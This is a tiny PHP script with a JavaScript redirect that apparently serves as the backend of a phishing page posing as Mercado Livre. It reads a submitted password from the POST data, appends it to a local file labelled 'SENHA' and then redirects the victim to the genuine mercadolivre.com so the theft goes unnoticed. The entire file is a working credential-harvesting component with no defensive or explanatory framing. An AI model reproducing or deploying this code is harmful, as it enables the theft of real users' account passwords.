<?php
$senha=$_POST['password']."\r\n";
$suasenha="SENHA: ";
$file = fopen("dados.txt","a");
$escrever5=fwrite($file, $suasenha);
$escrever6=fwrite($file, $senha);
fclose($file);

?>
<script language="JavaScript"> 
window.location="https://mercadolivre.com"; 
</script> 